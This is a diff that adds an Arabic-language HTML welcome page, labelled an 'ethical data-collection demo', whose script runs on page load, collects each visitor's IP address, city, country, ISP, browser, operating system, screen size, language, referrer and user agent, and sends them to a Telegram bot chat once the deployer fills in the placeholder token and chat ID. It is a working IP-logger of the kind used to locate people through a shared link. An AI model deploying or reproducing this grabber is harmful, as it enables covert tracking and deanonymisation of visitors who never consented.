@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرحباً بك! 👋</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2rem;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        .info-card {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px 0;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .info-item {
+            margin: 12px 0;
+            font-size: 1.1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .info-label {
+            font-weight: bold;
+        }
+
+        .info-value {
+            direction: ltr;
+            text-align: left;
+            flex: 1;
+            margin-right: 15px;
+        }
+
+        .loading {
+            color: #666;
+            font-style: italic;
+        }
+
+        .footer {
+            margin-top: 30px;
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        .typing-animation {
+            overflow: hidden;
+            border-right: 2px solid #333;
+            white-space: nowrap;
+            margin: 0 auto;
+            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: #333 }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🌐</div>
+        <h1 class="typing-animation">أهلاً وسهلاً بك!</h1>
+        <p class="subtitle">شكراً لزيارتك لموقعنا. هذا عرض توضيحي لجمع المعلومات بشكل أخلاقي.</p>
+        
+        <div class="info-card">
+            <div class="info-item">
+                <span class="info-label">🌍 عنوان IP:</span>
+                <span class="info-value" id="ip">جاري التحميل...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">📍 الموقع:</span>
+                <span class="info-value" id="location">جاري التحميل...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">💻 المتصفح:</span>
+                <span class="info-value" id="browser">جاري التحميل...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">📱 النظام:</span>
+                <span class="info-value" id="os">جاري التحميل...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">🖥 الدقة:</span>
+                <span class="info-value" id="resolution">جاري التحميل...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">🌐 اللغة:</span>
+                <span class="info-value" id="language">جاري التحميل...</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>يتم جمع هذه المعلومات لأغراض تقنية وتحليلية فقط</p>
+            <p>© 2024 جميع الحقوق محفوظة</p>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات التيليغرام - غير هذه القيم بالمعلومات الخاصة بك
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        // دالة لجمع معلومات المتصفح
+        function collectBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browser = "متصفح غير معروف";
+            let os = "نظام غير معروف";
+
+            // كشف المتصفح
+            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Google Chrome";
+            else if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
+            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Apple Safari";
+            else if (userAgent.includes("Edg")) browser = "Microsoft Edge";
+            else if (userAgent.includes("Opera")) browser = "Opera";
+
+            // كشف نظام التشغيل
+            if (userAgent.includes("Windows")) os = "Windows";
+            else if (userAgent.includes("Mac")) os = "macOS";
+            else if (userAgent.includes("Linux")) os = "Linux";
+            else if (userAgent.includes("Android")) os = "Android";
+            else if (userAgent.includes("iOS") || userAgent.includes("iPhone")) os = "iOS";
+
+            return { browser, os };
+        }
+
+        // دالة لجلب عنوان IP والمعلومات الجغرافية
+        async function getIPAndLocation() {
+            try {
+                // جلب عنوان IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // جلب المعلومات الجغرافية
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+
+                return {
+                    ip: ip,
+                    country: locationData.country_name || 'غير معروف',
+                    city: locationData.city || 'غير معروف',
+                    region: locationData.region || 'غير معروف',
+                    isp: locationData.org || 'غير معروف'
+                };
+            } catch (error) {
+                console.error('Error fetching IP/location:', error);
+                return {
+                    ip: 'غير متوفر',
+                    country: 'غير معروف',
+                    city: 'غير معروف',
+                    region: 'غير معروف',
+                    isp: 'غير معروف'
+                };
+            }
+        }
+
+        // دالة لإرسال الرسالة للتيليغرام
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Telegram API error');
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        // الدالة الرئيسية
+        async function init() {
+            // جمع المعلومات
+            const browserInfo = collectBrowserInfo();
+            const ipInfo = await getIPAndLocation();
+            
+            // معلومات إضافية
+            const resolution = `${screen.width} x ${screen.height}`;
+            const language = navigator.language || navigator.userLanguage || 'غير معروف';
+            const time = new Date().toLocaleString('ar-SA');
+            const referrer = document.referrer || 'زيارة مباشرة';
+
+            // تحديث الواجهة
+            document.getElementById('ip').textContent = ipInfo.ip;
+            document.getElementById('location').textContent = `${ipInfo.city}, ${ipInfo.country}`;
+            document.getElementById('browser').textContent = browserInfo.browser;
+            document.getElementById('os').textContent = browserInfo.os;
+            document.getElementById('resolution').textContent = resolution;
+            document.getElementById('language').textContent = language;
+
+            // إنشاء رسالة التيليغرام
+            const telegramMessage = `
+🆕 <b>زيارة جديدة للموقع</b>
+
+🌍 <b>IP:</b> <code>${ipInfo.ip}</code>
+📍 <b>الموقع:</b> ${ipInfo.city}, ${ipInfo.country}
+🏢 <b>المزود:</b> ${ipInfo.isp}
+
+💻 <b>المتصفح:</b> ${browserInfo.browser}
+📱 <b>النظام:</b> ${browserInfo.os}
+🖥 <b>الدقة:</b> ${resolution}
+🌐 <b>اللغة:</b> ${language}
+
+🔗 <b>المصدر:</b> ${referrer}
+⏰ <b>الوقت:</b> ${time}
+
+📊 <b>User Agent:</b>
+<code>${navigator.userAgent}</code>
+            `.trim();
+
+            // إرسال للتيليغرام
+            if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
+                await sendToTelegram(telegramMessage);
+            }
+        }
+
+        // تشغيل الكود عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
